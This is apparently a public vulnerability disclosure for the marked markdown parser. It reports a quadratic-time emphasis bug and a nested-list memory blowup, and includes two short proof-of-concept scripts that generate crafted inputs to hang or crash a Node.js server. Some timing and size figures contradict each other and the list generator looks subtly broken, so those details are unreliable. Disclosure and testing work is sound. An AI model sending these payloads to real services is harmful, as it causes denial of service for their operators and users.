# marked ReDoS / OOM - quadratic emphasis parsing + memory exhaustion via nested lists
## overview
[marked](https://github.com/markedjs/marked) v17.0.4 (and all current versions) has two algorithmic complexity vulnerabilities that allow denial of service via crafted markdown input.
1. the emphasis (bold/italic) parser exhibits O(n²) time complexity on unclosed delimiters
2. the list tokenizer has superlinear memory consumption on deeply nested lists (up to 496x input amplification)
both are exploitable with small inputs (<50KB) and require no authentication. any endpoint accepting markdown is vulnerable.
this was reported privately via GHSA (GHSA-2j45-q7r7-rpfj). the maintainer closed the advisory without publishing, stating it is "not a vulnerability" but rather a problem with the caller's implementation. per [GitHub's own documentation](https://docs.github.com/en/code-security/how-tos/report-and-fix-vulnerabilities/fix-reported-vulnerabilities/managing-privately-reported-security-vulnerabilities):
> "If you have enough information to determine that the problem the reporter describes is not a security risk, click Close security advisory."
the maintainer exercised this option. the responsible disclosure window is over.
## why this is a vulnerability
this violates [OWASP's Secure by Default principle](https://devguide.owasp.org/en/02-foundations/03-security-principles/). a library should be safe out of the box without requiring callers to implement mitigations. documentation is not a security control.
the maintainer's position is that users should use [web workers](https://marked.js.org/using_advanced#workers) when parsing untrusted markdown. by that logic, no parsing library would ever have security issues because you could always say "the caller should have sandboxed it."
marked already has CVEs for this exact class of bug:
- **CVE-2022-21680**: ReDoS in marked's heading parsing
- **CVE-2022-21681**: ReDoS in marked's inline parsing
both are still active in the NVD. neither has been revoked or disputed. this is the same class of issue, reported through the same process. the only thing that changed is the maintainer's willingness to engage with it.
## finding 1 - quadratic emphasis parsing (CWE-407)
the inline tokenizer's emStrong delimiter matching scans backwards through accumulated delimiter candidates. when input contains many unclosed emphasis openers (`*a ` repeated N times), each new opener must consider all previous openers, producing O(n²) total work.
**pattern:** `"*a ".repeat(N)`
**timing measurements on marked v17.0.4:**
- N=2000 (6 KB): ~0.8ms
- N=4000 (12 KB): ~3ms
- N=8000 (24 KB): ~12ms
- N=16000 (48 KB): ~35-38 seconds
doubling input roughly quadruples time. textbook quadratic.
### PoC
```js
const { marked } = require('marked');
// 48KB payload - takes ~35 seconds on v17.0.4
const payload = '*a '.repeat(16000);
console.time('parse');
marked.parse(payload);
console.timeEnd('parse');
```
## finding 2 - nested list memory exhaustion (CWE-770)
deeply nested markdown lists cause superlinear heap consumption in the tokenizer. each nesting level creates token objects with nested arrays, amplifying memory use far beyond input size.
**pattern:** `Array.from({length: depth}, (_, i) => ' '.repeat(i) + '- item').join('\\n')`
**memory measurements:**
- depth=500 (12.5 KB input): ~50 MB heap
- depth=750 (28 KB input): ~172 MB heap
- depth=1000 (500 KB input): Node.js OOM crash
this is heap exhaustion, not stack overflow. the process crashes with "JavaScript heap out of memory."
### PoC
```js
const { marked } = require('marked');
// generates ~500KB input - crashes Node.js
const depth = 1000;
const payload = Array.from({length: depth}, (_, i) =>
  ' '.repeat(i) + '- item'
).join('\\n');
console.log('input size:', payload.length, 'bytes');
marked.parse(payload); // crashes with OOM
```
## impact
any application using marked to parse user-supplied markdown on the server side is vulnerable to denial of service. the emphasis attack requires only 48KB of input to hang a single-threaded Node.js server for 35+ seconds. the nested list attack crashes the process entirely with <500KB of input.
## timeline
- **2026-03-04**: reported via GHSA to markedjs/marked
- **2026-03-05**: maintainer closed advisory, stating "not a vulnerability" and "unsafe implementation"
- **2026-03-06**: responded with technical arguments and prior CVE precedent
- **2026-03-06**: maintainer reiterated position, stated prior CVEs were issued before workers were documented
- **2026-03-06**: public disclosure (advisory closed without publishing = disclosure obligation fulfilled per GitHub docs)
## credit
discovered by [vmfunc](https://github.com/vmfunc)
